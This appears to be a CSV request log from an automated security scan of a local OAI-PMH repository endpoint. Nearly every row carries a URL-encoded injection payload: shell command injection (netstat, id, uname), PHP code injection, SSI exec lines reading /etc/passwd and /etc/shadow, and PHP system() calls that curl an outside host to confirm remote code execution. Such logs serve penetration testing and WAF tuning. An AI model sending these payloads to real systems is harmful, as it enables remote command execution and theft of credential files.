uuid,timestamp,http_status_code,request_url,response_time,http_version
7b28cb14-aa35-4c2d-8423-fcf28df86509,2024-12-31 01:25:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Bid%3B&until=%3Bid%3B&set=%3Bid%3B,2070.17 ms,HTTP/1.1
da8d4488-2aff-48e5-9bdf-a06cdf9c9d13,2024-12-31 01:25:30,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3Bid%3B,2073.78 ms,HTTP/1.1
d1e582e2-6ccd-4011-bd9d-1d5f7a70f2ef,2024-12-31 01:25:34,403,http://localhost:8081/oai/request?verb=%3Bid%5Cn,2063.70 ms,HTTP/1.1
dd4395ce-49ba-402a-bb9b-79adba4450f8,2024-12-31 01:25:37,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2071.32 ms,HTTP/1.1
bf716fc1-c6e7-40a2-bb21-ddfa8ce0011f,2024-12-31 01:25:39,200,http://localhost:8081/oai/request?verb=ListSets,2033.87 ms,HTTP/1.1
fc61b523-7139-4946-b8ad-087b74c8e333,2024-12-31 01:25:41,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2268.72 ms,HTTP/1.1
172d044e-bd3f-4827-8999-87092c72fed7,2024-12-31 01:25:44,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Bid%5Cn,2055.60 ms,HTTP/1.1
ce84ffba-98ba-4981-86a1-a48294e0e648,2024-12-31 01:25:48,403,http://localhost:8081/oai/request?verb=%3Bid%7C,2027.40 ms,HTTP/1.1
b7f02d1a-aad0-4f1d-bb06-a2deb660cf64,2024-12-31 01:25:50,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bid%7C,2045.62 ms,HTTP/1.1
0a06e12d-e767-465b-a0c2-53162b6541c0,2024-12-31 01:25:53,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Bid%7C,2074.84 ms,HTTP/1.1
d77a5a64-ac27-4566-aa71-97bc72cd5bc6,2024-12-31 01:25:55,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Bid%7C&until=%3Bid%7C&set=%3Bid%7C,2066.35 ms,HTTP/1.1
85771c31-f191-4fa7-8ce2-d782692c743e,2024-12-31 01:25:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Bid%7C&set=%3Bid%7C,2043.91 ms,HTTP/1.1
4fb5fee3-4d80-4031-89d7-6d6b5dcc0c63,2024-12-31 01:26:00,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bid%7C&metadataPrefix=marc,2073.40 ms,HTTP/1.1
e974fadc-de8a-4011-bc06-eeae2b9969c0,2024-12-31 01:26:02,403,http://localhost:8081/oai/request?verb=%3Bnetstat+-a%3B,2047.11 ms,HTTP/1.1
e6d73a34-df91-49a8-a1f4-f15f26f5e11c,2024-12-31 01:26:04,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bnetstat+-a%3B,2060.29 ms,HTTP/1.1
ff7d8c68-90ee-4d25-82b3-7c34f058a7b8,2024-12-31 01:26:06,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Bnetstat+-a%3B,2067.87 ms,HTTP/1.1
c3fbd1cb-2ee5-4304-b699-ed4abfc11dd6,2024-12-31 01:26:09,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Bnetstat+-a%3B&set=%3Bnetstat+-a%3B,2061.52 ms,HTTP/1.1
36ee21b4-c49f-4c26-9b01-4c26bae17b63,2024-12-31 01:26:11,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Bnetstat+-a%3B,2044.54 ms,HTTP/1.1
286ded80-8cc8-402f-b676-871e62832612,2024-12-31 01:26:13,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bnetstat+-a%3B&metadataPrefix=oai_dc,2109.88 ms,HTTP/1.1
f9ce22e0-cee6-4395-976c-24df3bf382dc,2024-12-31 01:26:16,403,http://localhost:8081/oai/request?verb=%3Bphpinfo%28%29,2062.74 ms,HTTP/1.1
b546515f-fbf2-414b-b441-81fe4580ca28,2024-12-31 01:26:18,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2044.18 ms,HTTP/1.1
cde20de2-2e46-4023-a501-0cd2eda0842e,2024-12-31 01:26:20,200,http://localhost:8081/oai/request?verb=ListSets,2088.44 ms,HTTP/1.1
9c2136f5-9b91-4ea4-a329-a0e1937cbe20,2024-12-31 01:26:22,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Bphpinfo%28%29,2058.32 ms,HTTP/1.1
b141c21b-3277-4e1d-8f04-9d417c06989c,2024-12-31 01:26:25,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Bphpinfo%28%29&until=%3Bphpinfo%28%29&set=%3Bphpinfo%28%29,2056.68 ms,HTTP/1.1
ac3e199b-dbf0-48d0-ba98-808e848cb9ad,2024-12-31 01:26:27,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bphpinfo%28%29&metadataPrefix=oai_dc,2097.06 ms,HTTP/1.1
7c25bbe0-baaf-4b59-a0d5-856079163048,2024-12-31 01:26:29,403,http://localhost:8081/oai/request?verb=%3Bphpinfo%28%29%3B%2F%2F,2063.64 ms,HTTP/1.1
44b8eb87-9b44-4644-9920-7ebbb5c3d8ea,2024-12-31 01:26:32,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bphpinfo%28%29%3B%2F%2F,2063.91 ms,HTTP/1.1
5d9727a3-c134-45f8-9a78-7902237cb6ad,2024-12-31 01:26:34,200,http://localhost:8081/oai/request?verb=ListSets,2077.96 ms,HTTP/1.1
5fbf8a3d-5dbf-4a8f-a1e6-6c2989628b55,2024-12-31 01:26:36,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Bphpinfo%28%29%3B%2F%2F&until=%3Bphpinfo%28%29%3B%2F%2F&set=%3Bphpinfo%28%29%3B%2F%2F,2034.59 ms,HTTP/1.1
486f8864-2f23-43df-a8f8-a4975ecbf071,2024-12-31 01:26:39,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Bphpinfo%28%29%3B%2F%2F&until=%3Bphpinfo%28%29%3B%2F%2F,2060.56 ms,HTTP/1.1
7e5879a6-6414-48d3-a6d0-6f110d6cb0c5,2024-12-31 01:26:41,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bphpinfo%28%29%3B%2F%2F&metadataPrefix=marc,2067.56 ms,HTTP/1.1
80983e95-3cf7-4faa-b164-862c3ca8b077,2024-12-31 01:26:43,403,http://localhost:8081/oai/request?verb=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29,2046.94 ms,HTTP/1.1
1156ff51-c2eb-4f22-8c3c-af57d70f12cd,2024-12-31 01:26:45,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29,2071.64 ms,HTTP/1.1
6aba820c-29de-43cc-a1df-749ecaba5ef1,2024-12-31 01:26:48,200,http://localhost:8081/oai/request?verb=ListSets,2090.82 ms,HTTP/1.1
f906c26f-e792-4121-a5d2-44d14e65471e,2024-12-31 01:26:50,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29&set=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29,2044.42 ms,HTTP/1.1
c44ac79a-6145-49e0-ad6c-c487544e0ba4,2024-12-31 01:26:52,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29&until=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29,2058.86 ms,HTTP/1.1
5950321c-347f-4658-850a-d140346b1316,2024-12-31 01:26:54,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29&metadataPrefix=marc,2039.42 ms,HTTP/1.1
04c84b1f-fadb-46ac-8f97-8d0b3ab3ffaf,2024-12-31 01:26:57,403,http://localhost:8081/oai/request?verb=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,2064.01 ms,HTTP/1.1
637b8a98-4f86-4631-9c90-66531263e1c9,2024-12-31 01:26:59,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,2041.24 ms,HTTP/1.1
f2d02ef1-da55-457b-8e7b-d3e35db346ec,2024-12-31 01:27:01,200,http://localhost:8081/oai/request?verb=ListSets,2059.16 ms,HTTP/1.1
79f5d529-f722-46db-b582-3503be701d12,2024-12-31 01:27:04,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,2040.51 ms,HTTP/1.1
c1753032-b9f1-4116-92ea-b0fa9fbe43c5,2024-12-31 01:27:06,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29&until=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,2042.19 ms,HTTP/1.1
fc80259e-2a30-4aae-b170-a9426b9fdc05,2024-12-31 01:27:08,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29&metadataPrefix=oai_dc,2049.06 ms,HTTP/1.1
65b3ab14-02f1-4662-9d16-dbad42ec0e2b,2024-12-31 01:27:10,403,http://localhost:8081/oai/request?verb=%3Bsystem%28%27id%27%29,2059.03 ms,HTTP/1.1
594ade2d-e34a-49ac-b37a-4b5b69e4ff7a,2024-12-31 01:27:13,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2058.73 ms,HTTP/1.1
76b7599f-fc82-4759-b2b7-b4b245ad079a,2024-12-31 01:27:15,200,http://localhost:8081/oai/request?verb=ListSets,2060.58 ms,HTTP/1.1
a1f4395e-013a-4b86-a531-4e4fef2e62ab,2024-12-31 01:27:17,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Bsystem%28%27id%27%29&set=%3Bsystem%28%27id%27%29,2041.19 ms,HTTP/1.1
21cdc61a-dd96-4518-8ccd-d6d98344ba7e,2024-12-31 01:27:20,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Bsystem%28%27id%27%29,2059.32 ms,HTTP/1.1
a6e7966e-a883-4f2b-888a-32efa562c960,2024-12-31 01:27:22,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Bsystem%28%27id%27%29&metadataPrefix=oai_dc,2026.88 ms,HTTP/1.1
952f4301-1498-4564-8c73-84fb82f2cce8,2024-12-31 01:27:24,403,http://localhost:8081/oai/request?verb=%3Buname%3B,2066.04 ms,HTTP/1.1
7ee23b4e-1cf3-47f9-a186-d6a94c992dd8,2024-12-31 01:27:26,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Buname%3B,2056.09 ms,HTTP/1.1
1bd1d8a4-7148-4433-b395-cc33f5fcc13e,2024-12-31 01:27:29,200,http://localhost:8081/oai/request?verb=ListSets,2056.37 ms,HTTP/1.1
ed4b4d39-5b4e-4e22-a2ea-dd570c72874a,2024-12-31 01:27:31,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Buname%3B,2068.14 ms,HTTP/1.1
bd37c744-4a0a-4793-9d83-f0b899bf566a,2024-12-31 01:27:33,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Buname%3B&set=%3Buname%3B,2060.16 ms,HTTP/1.1
f0bb03fd-cd0b-44c5-b826-dfcc5ead90a2,2024-12-31 01:27:38,403,http://localhost:8081/oai/request?verb=%3B%7B%24_GET%5B%22cmd%22%5D%7D,2051.29 ms,HTTP/1.1
3dddfc47-20cf-4164-8ea5-88ce58f2253e,2024-12-31 01:27:40,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B%7B%24_GET%5B%22cmd%22%5D%7D,2082.48 ms,HTTP/1.1
2480ca42-3b3c-42ed-ad5e-7152c95c7888,2024-12-31 01:27:42,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3B%7B%24_GET%5B%22cmd%22%5D%7D,2079.94 ms,HTTP/1.1
459586ec-e0a1-43fb-a4ee-ab16a45acbc7,2024-12-31 01:27:45,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3B%7B%24_GET%5B%22cmd%22%5D%7D&set=%3B%7B%24_GET%5B%22cmd%22%5D%7D,2083.33 ms,HTTP/1.1
183a63ee-6e6a-437b-8443-108eb6c8b8ac,2024-12-31 01:27:47,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3B%7B%24_GET%5B%22cmd%22%5D%7D&set=%3B%7B%24_GET%5B%22cmd%22%5D%7D,2041.51 ms,HTTP/1.1
284f70dd-7632-4fc9-80e6-dfdc0d15f7b6,2024-12-31 01:27:49,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B%7B%24_GET%5B%22cmd%22%5D%7D&metadataPrefix=marc,2056.42 ms,HTTP/1.1
ab4a8b25-03fa-4369-8174-9073640e71e2,2024-12-31 01:27:52,403,http://localhost:8081/oai/request?verb=%3B%7C%2Fusr%2Fbin%2Fid%7C,2035.86 ms,HTTP/1.1
39fe0c4a-f096-47af-9498-2487e9b9edec,2024-12-31 01:27:54,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3B%7C%2Fusr%2Fbin%2Fid%7C,2061.91 ms,HTTP/1.1
763e9fdb-3717-47ea-a439-383c7db71195,2024-12-31 01:27:56,200,http://localhost:8081/oai/request?verb=ListSets,2070.57 ms,HTTP/1.1
5d585b4a-f68c-41f9-8fc1-e43be22605d3,2024-12-31 01:27:58,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3B%7C%2Fusr%2Fbin%2Fid%7C,2082.56 ms,HTTP/1.1
e75abb9b-b9e3-4e5f-9c1c-6d07f683110e,2024-12-31 01:28:01,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3B%7C%2Fusr%2Fbin%2Fid%7C&set=%3B%7C%2Fusr%2Fbin%2Fid%7C,2027.58 ms,HTTP/1.1
bd1515fe-9298-43d5-80d1-2a3eb5a28e73,2024-12-31 01:28:03,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3B%7C%2Fusr%2Fbin%2Fid%7C&metadataPrefix=marc,2066.52 ms,HTTP/1.1
897f2014-d420-4105-9d05-ff6150183d76,2024-12-31 01:28:05,403,http://localhost:8081/oai/request?verb=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E,2062.68 ms,HTTP/1.1
4f628eb6-4d6d-44e9-b176-8df9d05da389,2024-12-31 01:28:08,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2087.38 ms,HTTP/1.1
9408c891-cc84-4249-9a4a-72c4e7041561,2024-12-31 01:28:10,200,http://localhost:8081/oai/request?verb=ListSets,2072.74 ms,HTTP/1.1
7e2c4764-36e9-4020-8b31-ab10bb208d73,2024-12-31 01:28:12,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E,2081.41 ms,HTTP/1.1
82c7d122-3da3-4ea9-ac02-e055c1a63a69,2024-12-31 01:28:14,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E&set=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E,2060.70 ms,HTTP/1.1
a9acacc3-bc59-49c4-a9fb-5b3cc61d790b,2024-12-31 01:28:17,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E&metadataPrefix=marc,2055.93 ms,HTTP/1.1
d866ae5f-998e-4d11-a898-df896a2efa50,2024-12-31 01:28:19,403,http://localhost:8081/oai/request?verb=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E,2069.73 ms,HTTP/1.1
c829de24-2927-476c-9100-f422f1e71d23,2024-12-31 01:28:21,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2066.76 ms,HTTP/1.1
b103b08a-2699-4bc1-9356-7ddaca29a0d6,2024-12-31 01:28:24,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E,2055.17 ms,HTTP/1.1
4a387603-be8f-4d10-8267-2b7dcb9970d1,2024-12-31 01:28:26,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E,2067.52 ms,HTTP/1.1
00720315-ccd5-45fe-b08d-fa11071ce3bb,2024-12-31 01:28:28,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E&until=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E,2068.81 ms,HTTP/1.1
5cfbb134-8452-43b4-ac4f-5313d0a304d1,2024-12-31 01:28:30,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E&metadataPrefix=oai_dc,2103.39 ms,HTTP/1.1
761f47aa-97ac-4788-b8ba-cd7c07515eab,2024-12-31 01:28:33,403,http://localhost:8081/oai/request?verb=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E,2064.37 ms,HTTP/1.1
da1124f7-1c6e-4cae-9f19-6fac5832c3b7,2024-12-31 01:28:35,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E,2085.50 ms,HTTP/1.1
c00b5fb7-d006-4757-b15c-fac5f92d614e,2024-12-31 01:28:37,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E,2040.61 ms,HTTP/1.1
80eaf114-9304-4d49-b607-73f35acb3d33,2024-12-31 01:28:40,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E&until=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E,2045.60 ms,HTTP/1.1
dfd5ceae-cad3-4ae0-a6dd-0af965d5b4fb,2024-12-31 01:28:42,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E,2031.89 ms,HTTP/1.1
a9a5b314-3621-41a6-afba-2c59741f1dff,2024-12-31 01:28:44,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E&metadataPrefix=marc,2087.87 ms,HTTP/1.1
00abc247-4587-4ed4-86ec-db6f40eb8ff4,2024-12-31 01:28:46,403,http://localhost:8081/oai/request?verb=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E,2048.50 ms,HTTP/1.1
4d8e8ae9-9c57-49c8-8891-aa584d6c2a9b,2024-12-31 01:28:49,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E,2081.11 ms,HTTP/1.1
1a609898-51ae-4785-ad72-73aa1bdab6d6,2024-12-31 01:28:51,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E,2055.52 ms,HTTP/1.1
4023fd5e-ff3e-4abd-980a-02847f316176,2024-12-31 01:28:53,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E,2076.54 ms,HTTP/1.1
3105653f-ed1b-46d9-9129-0267a55f80e8,2024-12-31 01:28:56,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2504.77 ms,HTTP/1.1
a7a1ec82-2dc4-42f5-aae0-2f1c4fddbbcb,2024-12-31 01:28:58,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E&metadataPrefix=marc,2039.02 ms,HTTP/1.1
69f6c845-6b6b-4358-bd28-344d5c8af607,2024-12-31 01:29:00,403,http://localhost:8081/oai/request?verb=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E,2059.16 ms,HTTP/1.1
b8edb9e2-c43d-4c05-a175-cddab664c640,2024-12-31 01:29:03,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E,2063.14 ms,HTTP/1.1
515b6266-cac4-4dd0-8673-d88f9d160e4c,2024-12-31 01:29:05,200,http://localhost:8081/oai/request?verb=ListSets,2036.67 ms,HTTP/1.1
2cf125a2-9e7d-4425-b275-0b8f33180318,2024-12-31 01:29:07,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E&set=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E,2049.76 ms,HTTP/1.1
6cc7d08f-2810-4e35-ace8-23c5d696783d,2024-12-31 01:29:10,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E&until=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E&set=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E,2038.60 ms,HTTP/1.1
f77bf11f-7428-4153-b62e-d6d9f6dc8373,2024-12-31 01:29:12,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Fmethod%3Dphpsystem_get%22%29%3B%3F%3E&metadataPrefix=marc,2046.77 ms,HTTP/1.1
4e36f76c-06f4-4e7c-adb6-38f0829ece43,2024-12-31 01:29:14,403,http://localhost:8081/oai/request?verb=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3Ddf2fkjj%22%29%3B%3F%3E,2044.88 ms,HTTP/1.1
abb1261c-1c3f-465a-9f59-504711c2481a,2024-12-31 01:29:16,403,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3Ddf2fkjj%22%29%3B%3F%3E,2072.23 ms,HTTP/1.1
84a806d8-b6ed-4cea-bec8-78890c0513bd,2024-12-31 01:29:19,200,http://localhost:8081/oai/request?verb=ListSets,2064.71 ms,HTTP/1.1
da0db7a1-1e05-455a-a07d-c531c5ec31ba,2024-12-31 01:29:21,403,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3Ddf2fkjj%22%29%3B%3F%3E,2053.37 ms,HTTP/1.1
dd0b1cd2-9cf8-47b2-8ade-2ef6a5fb3986,2024-12-31 01:29:24,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2500.46 ms,HTTP/1.1
8e6a0f21-b933-41b6-b282-29c6cf327121,2024-12-31 01:29:26,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3C%3Fphp+system%28%22curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3Ddf2fkjj%22%29%3B%3F%3E&metadataPrefix=oai_dc,2059.76 ms,HTTP/1.1
